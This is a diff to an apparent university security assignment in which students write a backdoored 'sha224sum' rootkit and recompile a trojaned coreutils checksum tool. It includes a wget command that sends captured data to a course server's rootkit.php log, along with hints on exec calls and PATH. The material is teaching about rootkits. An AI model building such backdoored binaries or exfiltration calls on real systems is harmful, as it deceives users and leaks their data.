@@ -185,7 +185,7 @@ You can do this in any language that you want:
   2150](https://uva-cs.github.io/pdr/slides/04-arrays-bigoh.html#/cmdlineparams)
   and the source code linked to on that page; to execute another
   program, you will want to use the
-  [exec()](https://www.systutorials.com/docs/linux/man/3-exec/) C
+  [execl()](https://www.systutorials.com/docs/linux/man/3-exec/) C
   function, which is in the `<unistd.h>` library.
 - We can't use Java -- we need the executable name to be `sha224sum`,
   not `sha224sum.class`
@@ -287,7 +287,7 @@ you just call a URL:
 where mst3k is your userid and the `...` is the data you are sending.
 You can do this via a `wget` call (again, executing a command-line
 program from the C/C++ program via
-[exec()](https://www.systutorials.com/docs/linux/man/3-exec/)): 
+[execl()](https://www.systutorials.com/docs/linux/man/3-exec/)): 
 `wget https//libra.cs.virginia.edu/rootkit.php?userid=mst3k&data=...`.
 This puts the information into the apache web server log.  There are
 more efficient ways to do this, but putting it into the apache log is
@@ -310,6 +310,24 @@ file.  We will unpack and configure the entire coreutils archive, put
 the md5sum.c file in there, and then recompile the `sha384sum`
 program.  Thus, you do NOT need anything in your Makefile for this
 task
+
+## Hints and tips
+
+We've collected a few of these here...
+
+
+- The `which` command in linux tells you where the specified system
+  binary is in the filesystem; for example, if you enter 'which ls',
+  the path to the ls binary (/bin/ls) should be printed out
+- Similarly, the `PATH` environment variable indicates all the
+  possible locations that the system looks for when you want to
+  execute a command. You can view it with `echo $PATH`
+- If you finished the backdoored `sha224sum` rootkit, but it's not
+  printing out anything, consider flushing out stdout to force print
+  the contents in the stdout buffer.
+- `exec()` refers to a family of functions that can execute other
+  processes; we recommend using `execl()` for this assignment (though
+  you are free to do otherwise!)
 
 ## Submission
 
